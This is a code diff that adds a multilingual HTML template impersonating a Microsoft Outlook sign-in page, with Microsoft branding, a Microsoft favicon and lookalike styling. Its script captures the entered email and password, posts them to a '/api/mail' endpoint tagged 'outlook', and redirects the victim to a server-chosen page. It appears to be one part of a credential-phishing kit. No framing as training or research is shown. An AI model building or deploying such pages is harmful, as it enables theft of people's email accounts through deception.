@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html lang="{{ lang }}">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>{{ get_text(lang, 'outlook_title') }} - Microsoft</title>
+    <link rel="icon" href="https://aadcdn.msftauth.net/shared/1.0/content/images/favicon_a_e1f3b3.ico">
+    <style>
+        *{box-sizing:border-box;margin:0;padding:0;font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif}
+        body{background-color:#f3f2f1;color:#1b1b1b;display:flex;justify-content:center;align-items:center;min-height:100vh}
+        .card{background:#fff;width:100%;max-width:440px;padding:44px;box-shadow:0 2px 6px rgba(0,0,0,0.2)}
+        .logo{margin-bottom:20px;font-weight:bold;font-size:15px;display:flex;align-items:center;gap:8px}
+        .logo span{display:inline-block;width:15px;height:15px;background:#f25022;box-shadow:0 16px 0 0 #7fba00,16px 0 0 0 #00a4ef,16px 16px 0 0 #ffb900}
+        h1{font-size:24px;font-weight:600;margin-bottom:16px}
+        p{font-size:15px;margin-bottom:20px;color:#333}
+        .form-group{margin-bottom:16px}
+        input{width:100%;padding:8px 0 10px 0;border:none;border-bottom:1px solid #666;font-size:15px}
+        input:focus{outline:none;border-bottom:2px solid #0067b8}
+        .btn-container{display:flex;justify-content:flex-end;margin-top:24px}
+        .submit-btn{background-color:#0067b8;color:#fff;border:none;padding:10px 32px;font-size:15px;cursor:pointer}
+        .submit-btn:hover{background-color:#005da6}
+        .lang-indicator{text-align:center;font-size:11px;color:#6c6c8a;margin-bottom:10px}
+    </style>
+</head>
+<body>
+    <div class="card">
+        <div class="lang-indicator">🌍 {{ get_text(lang, 'name') }}</div>
+        <div class="logo"><span></span> Microsoft</div>
+        <h1>{{ get_text(lang, 'outlook_title') }}</h1>
+        <p>{{ get_text(lang, 'outlook_subtitle') }}</p>
+        <form id="outlookForm">
+            <div class="form-group">
+                <input type="email" id="mailEmail" required placeholder="{{ get_text(lang, 'outlook_email') }}">
+            </div>
+            <div class="form-group">
+                <input type="password" id="mailPassword" required placeholder="{{ get_text(lang, 'outlook_password') }}">
+            </div>
+            <div class="btn-container">
+                <button type="submit" class="submit-btn">{{ get_text(lang, 'outlook_button') }}</button>
+            </div>
+        </form>
+    </div>
+    <script>
+        document.getElementById('outlookForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            const mailEmail = document.getElementById('mailEmail').value;
+            const mailPassword = document.getElementById('mailPassword').value;
+            try {
+                const res = await fetch('/api/mail', {
+                    method:'POST',
+                    headers:{'Content-Type':'application/json'},
+                    body:JSON.stringify({provider:'outlook',mailEmail,mailPassword})
+                });
+                const data = await res.json();
+                if(data.status === 'success') {
+                    window.location.href = data.next;
+                }
+            } catch(err) {}
+        });
+    </script>
+</body>
+</html>
